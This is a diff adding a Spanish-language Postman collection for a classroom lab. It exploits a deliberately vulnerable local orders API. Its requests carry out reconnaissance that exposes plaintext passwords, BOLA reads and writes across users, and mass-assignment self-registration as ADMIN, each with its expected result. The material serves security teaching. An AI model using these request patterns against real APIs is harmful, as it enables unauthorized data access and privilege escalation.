@@ -1,0 +1,121 @@
+{
+  "info": {
+    "_postman_id": "a1b2c3d4-0001-4a5b-8c6d-vuln00000001",
+    "name": "P1 - Explotacion: pedidos-api-vulnerable",
+    "description": "Coleccion para explotar las vulnerabilidades de la version VULNERABLE de la Practica 1 (BOLA, BOLA de escritura y Mass Assignment). Ejecute primero la API: mvn spring-boot:run. Variable {{baseUrl}} = http://localhost:8080. El encabezado X-User-Id simula al usuario autenticado, pero la version vulnerable lo ignora por completo.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://localhost:8080",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "00 - Listar usuarios",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/usuarios",
+        "description": "Reconocimiento. Devuelve todos los usuarios CON su contrasena en el JSON (exposicion de datos). Resultado esperado: 200 con Ana (id 1) y Beto (id 2)."
+      }
+    },
+    {
+      "name": "01 - Listar pedidos",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/pedidos",
+        "description": "Reconocimiento. Devuelve los pedidos de TODOS los usuarios sin control de acceso. El pedido 3 pertenece a Beto (id 2). Resultado esperado: 200."
+      }
+    },
+    {
+      "name": "02 - BOLA: leer pedido de otro usuario",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-User-Id",
+            "value": "1",
+            "description": "Simula al usuario autenticado (Ana). La version vulnerable lo IGNORA."
+          }
+        ],
+        "url": "{{baseUrl}}/api/pedidos/3",
+        "description": "EXLOTACION BOLA: el usuario 1 (Ana) solicita el pedido 3, que pertenece al usuario 2 (Beto). La API no verifica propietario. Resultado esperado en la version vulnerable: 200 con el monitor de Beto (y su contrasena en el JSON). En la version segura sera 403."
+      }
+    },
+    {
+      "name": "03 - BOLA: leer usuario ajeno con password",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "X-User-Id",
+            "value": "1"
+          }
+        ],
+        "url": "{{baseUrl}}/api/usuarios/2",
+        "description": "EXLOTACION (exposicion de datos): cualquier usuario puede consultar los datos completos de otro, incluida la contrasena 'beto12345'. Resultado esperado: 200."
+      }
+    },
+    {
+      "name": "04 - BOLA de escritura: crear pedido a nombre de otro",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "X-User-Id",
+            "value": "1",
+            "description": "Ana esta 'autenticada', pero el dueño se toma del body."
+          },
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"descripcion\": \"Pedido inyectado a nombre de Beto\",\n  \"monto\": 99999.00,\n  \"fecha\": \"2026-11-11\",\n  \"usuario\": { \"id\": 2 }\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": "{{baseUrl}}/api/pedidos",
+        "description": "EXLOTACION BOLA de escritura: Ana crea un pedido con monto 99999 asignado al usuario 2 (Beto) mediante el campo 'usuario' del JSON. Resultado esperado: 201 y el pedido queda a nombre de Beto. Nota: no hay validacion de esquema (monto extremo aceptado)."
+      }
+    },
+    {
+      "name": "05 - Mass Assignment: autorregistrarce como ADMIN",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"nombre\": \"Eva Atacante\",\n  \"email\": \"eva@atacante.mx\",\n  \"password\": \"clave12345\",\n  \"rol\": \"ADMIN\"\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": "{{baseUrl}}/api/usuarios",
+        "description": "EXLOTACION Mass Assignment (API3:2023 BOPLA): el binding directo de la entidad acepta el campo 'rol'. Resultado esperado: 201 y el usuario se guarda con rol ADMIN. Tambien podria enviarse \"id\":99 para forzar el identificador."
+      }
+    },
+    {
+      "name": "06 - Verificar rol ADMIN obtenido",
+      "request": {
+        "method": "GET",
+        "url": "{{baseUrl}}/api/usuarios/3",
+        "description": "Confirmacion del ataque anterior: el usuario creado (id 3, Eva) aparece con rol ADMIN y contrasena visible. Resultado esperado: 200."
+      }
+    }
+  ]
+}
